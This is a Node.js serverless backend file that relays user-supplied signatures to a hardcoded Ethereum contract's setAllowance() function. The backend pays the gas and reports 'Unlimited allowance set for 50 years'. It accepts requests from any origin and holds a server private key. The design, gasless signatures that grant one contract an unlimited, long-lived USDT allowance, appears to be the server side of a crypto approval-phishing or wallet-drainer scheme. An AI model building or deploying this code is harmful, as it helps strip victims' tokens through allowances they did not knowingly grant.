// api/submit.js
// ============================================
// USDT Allowance - Backend API
// ============================================

const { ethers } = require('ethers');

module.exports = async (req, res) => {
    // ============================================
    // 1. CORS Headers
    // ============================================
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // ============================================
    // 2. Handle OPTIONS (Preflight)
    // ============================================
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================
    // 3. GET Request - Test
    // ============================================
    if (req.method === 'GET') {
        return res.status(200).json({
            status: 'OK',
            message: 'API is working!',
            timestamp: new Date().toISOString()
        });
    }

    // ============================================
    // 4. Only POST allowed
    // ============================================
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            error: 'Method not allowed. Use POST.'
        });
    }

    // ============================================
    // 5. Main Logic
    // ============================================
    try {
        // Get data from request body
        const { user, nonce, deadline, signature } = req.body;

        console.log('📥 Received:');
        console.log('  👤 User:', user);
        console.log('  📝 Nonce:', nonce);
        console.log('  ⏰ Deadline:', deadline);
        console.log('  📝 Signature:', signature ? signature.substring(0, 40) + '...' : 'null');

        // ============================================
        // 6. Configuration
        // ============================================
        const CONFIG = {
            rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
            privateKey: process.env.PRIVATE_KEY,
            contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837"
        };

        // Check configs
        if (!CONFIG.privateKey) {
            console.error('❌ PRIVATE_KEY not set!');
            return res.status(500).json({
                success: false,
                error: 'PRIVATE_KEY not set in environment variables'
            });
        }

        if (!process.env.ALCHEMY_API_KEY) {
            console.error('❌ ALCHEMY_API_KEY not set!');
            return res.status(500).json({
                success: false,
                error: 'ALCHEMY_API_KEY not set in environment variables'
            });
        }

        console.log('🔧 Config:');
        console.log('  📋 Contract:', CONFIG.contractAddress);
        console.log('  🔑 PrivateKey:', '✅ Set');
        console.log('  🔑 Alchemy:', '✅ Set');

        // ============================================
        // 7. Initialize Provider & Wallet
        // ============================================
        console.log('⏳ Initializing...');
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
        const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
        console.log('👛 Wallet:', wallet.address);

        // ============================================
        // 8. Smart Contract Setup
        // ============================================
        const contractABI = [
            "function setAllowance(address user, uint256 nonce, uint256 deadline, bytes calldata signature) external"
        ];

        const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);

        // ============================================
        // 9. Submit Transaction (Backend pays gas!)
        // ============================================
        console.log('⏳ Submitting setAllowance()...');
        console.log('⛽ Gas paid by:', wallet.address);

        const tx = await contract.setAllowance(
            user,
            nonce,
            deadline,
            signature
        );

        console.log('📤 Tx Hash:', tx.hash);

        // ============================================
        // 10. Wait for Confirmation
        // ============================================
        console.log('⏳ Waiting for confirmation...');
        const receipt = await tx.wait();

        console.log('✅ Confirmed!');
        console.log('📦 Block:', receipt.blockNumber);

        // ============================================
        // 11. Return Success
        // ============================================
        return res.status(200).json({
            success: true,
            message: '✅ Unlimited allowance set for 50 years! Gas paid by backend.',
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString(),
            etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
        });

    } catch (error) {
        console.error('❌ Error:', error.message);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
